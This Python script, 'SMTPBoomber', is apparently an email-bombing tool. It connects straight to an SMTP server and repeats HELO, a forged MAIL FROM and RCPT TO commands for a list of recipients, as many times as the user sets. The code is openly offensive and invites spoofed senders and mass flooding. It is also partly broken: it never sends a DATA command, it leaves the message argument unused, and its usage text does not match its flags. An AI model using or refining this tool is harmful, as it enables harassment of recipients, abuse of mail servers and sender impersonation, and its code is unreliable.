#!/usr/bin/env python
import socket
import argparse



class SMTPBoomber:
    def __init__(self,GreetingServer,Sender,Recievers,Message,Count, HOST, PORT):
        self.GreetingServer = GreetingServer
        self.Sender = Sender
        
        self.Recievers = Recievers.split(",")
        self.Message = Message

        
        self.Count = Count

        self.HOST = HOST
        self.PORT = PORT

        self.cc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.cc.connect((self.HOST, self.PORT))
        print(self.cc.recv(1024).decode())
        

    def start(self):
        HELO = f"HELO {self.GreetingServer}\r\n"
        self.cc.send((str.encode(HELO)))
        print(self.cc.recv(1024).decode())

        print("SENDER:")
        SENDEREmail = f"MAIL FROM: <{self.Sender}>\r\n"
      
        self.cc.send((str.encode(SENDEREmail)))
        print(self.cc.recv(1024).decode())


        for i in range(0,len(self.Recievers)):
            

            print(f"RECIEVER: {self.Recievers[i]}")
            
            RECIEVEREmail = f"RCPT TO: <{self.Recievers[i]}>\r\n"
            self.cc.send(((str.encode(RECIEVEREmail))))
            print(self.cc.recv(1024).decode())

       


    def repeater(self):
      
        for i in range(0,self.Count):
            print(f"START {'='*50} Count-> {i+1} {'='*50} START")
            self.start()
            print(f"END {'='*50} Count-> {i+1} {'='*50} END")






if __name__ == "__main__":

    parser = argparse.ArgumentParser(prog="SMTPBoomber.py", epilog="", usage="SMTPBoomber.py -h [HOST] -p [PORT] -s [Sender's Email] -R [Recievers] -c [Count] -M [Message]" , prefix_chars='-', add_help=True)

    parser.add_argument('-H', action='store', metavar='HOST', type=str, help='HOST where SMTP is running', required=True)
    parser.add_argument('-P', action='store', metavar='PORT', type=int, help='PORT Where SMTP is running', required=True)
    parser.add_argument('-s', action='store', metavar='Sender', type=str, help='Sender of the Email', required=True)
    parser.add_argument('-R', action='store', metavar='Recievers', type=str, help='Recievers by a comma.\tExample: test@gmail.com,test2@gmail.com', required=True)
    parser.add_argument('-c', action='store', metavar='Count', type=int, help='How many email to be send', required=True)
    parser.add_argument('-M', action='store', metavar='Message', type=str, help='Message to be send', required=True)
    parser.add_argument('-G', action='store', metavar='Greeting', type=str, help='Greeting Server Ex: gmail.com', required=False, default="gmail.com")

    parser.add_argument('-v', action='version', version='SMTPBoomber - v1.0', help='Prints the version of SMTPBoomber.py')

    args = parser.parse_args()
    if not args.H or not args.P or not args.s or not args.R or not args.c or not args.M:
     
        print(parser.print_help())
        exit()
  


    Boomber = SMTPBoomber(args.G,args.s,args.R,args.M,args.c,args.H,args.P)
    Boomber.repeater()